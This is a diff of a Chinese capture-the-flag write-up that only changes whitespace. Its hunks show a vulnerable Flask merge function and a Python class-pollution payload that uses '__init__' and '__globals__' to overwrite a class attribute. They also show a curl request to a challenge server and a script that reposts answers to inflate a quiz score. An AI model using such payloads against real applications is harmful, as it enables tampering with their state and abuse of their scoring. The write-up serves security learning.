@@ -123,7 +123,7 @@ f12有用捏
 
 附件有一个src,这里贴一下源码
 ```python
-# app.py
+# app.py  
 
 from flask import Flask, render_template, request, jsonify
 app = Flask(__name__)
@@ -134,7 +134,7 @@ class money:
 flag_file_path = "flag"
 def update(src,dst):
     for key, value in src.items():
-        if hasattr(dst, '__getitem__'):  #这里判断dst是否为字典.字典有一个__getitem__方法
+        if hasattr(dst, '__getitem__'):  #这里判断dst是否为字典.字典有一个__getitem__方法  
             if dst.get(key) and type(value) == dict:
                 update(value, dst.get(key))
             else:
@@ -232,10 +232,10 @@ $ curl -X POST http://182.202.178.28:31828/update -H "Content-Type: application/
 
 ```python
 if __name__ == '__main__':
-    print(money.balance) # 30
+    print(money.balance) # 30  
     m = money()
     globals()['money'].balance = 50
-    print(money.balance) # 50
+    print(money.balance) # 50  
     payload = {
         "__init__":{
             "__globals__":{
@@ -246,7 +246,7 @@ if __name__ == '__main__':
         }
     }
     update(payload, m)
-    print(money.balance) # 999
+    print(money.balance) # 999  
 ```
                     
 这里已经通过更改传入update的参数已经可以修改到全局类`money`中的类属性值.
@@ -377,10 +377,10 @@ func Waf(code string) bool {
 
 需要注意的是, 对于一个request类, 用text方法获取到的消息体, 是字符串格式的. 这里需要用python的`json`库将这个字符串变成json格式的python字典
 ```python
-question_list_text = requests.get(url+"/questions").text # 这是字符串
-print(len(question_list_text)) # 95654
-question_list = json.loads(question_list_text) # 这是嵌套列表的字典
-print(len(question_list))  # 600
+question_list_text = requests.get(url+"/questions").text # 这是字符串  
+print(len(question_list_text)) # 95654  
+question_list = json.loads(question_list_text) # 这是嵌套列表的字典  
+print(len(question_list))  # 600  
 ```
 题目的本意是让人获取到这个题库的答案列表之后, 批量对每一个题目发送对应的答案, 但是大家似乎都没这么做
 
@@ -391,14 +391,14 @@ print(len(question_list))  # 600
 
 我其实是走的第二个路线, 但因为写了个死循环产生了第四个路线: 只答第一题, 因为只会答第一题.
 ```python
-# Post Answer
+# Post Answer   
 """
 这里其实写错了
 while True没加break,结果重复答第一题,但是分数一直在加.
 最后直接获取flag了
 应该在try语句末尾加break的
 """
-# answer_list = ['B','这里本来应该是另外599个答案']
+# answer_list = ['B','这里本来应该是另外599个答案']   
 hack_s = requests.Session()
 hack_s.get(url=url)
 print(f"answer_list:{answer_list}")
@@ -409,7 +409,7 @@ for question_index in range(0,600):
             print(f"Posting quesion{question_index}. Answer:{answer_list[question_index]}", end=' ')
             answer_response_post = hack_s.post(url=url+"/api/answer", json=answer_post_json, timeout=3)
             print("Success!")
-            # 可以看到这里忘了加 break
+            # 可以看到这里忘了加 break  
         except requests.exceptions.Timeout:
             print("Timeout. Retrying.")
     while True:
@@ -419,7 +419,7 @@ for question_index in range(0,600):
             print("Success!")
             current_score = json.loads(score_response_post.text)['score']
             print(f"Current score:{current_score}")
-            # 可以看到这里也忘了加 break
+            # 可以看到这里也忘了加 break  
         except requests.exceptions.Timeout: 
             print("Timeout. Retrying.")
 
@@ -493,7 +493,7 @@ func login(c *gin.Context) {
 
 其实普通用户也能控制邮件发出人是谁, 根本不是只读. 抓取一下发邮件的包就知道了.
 
-    
+
 
 
  
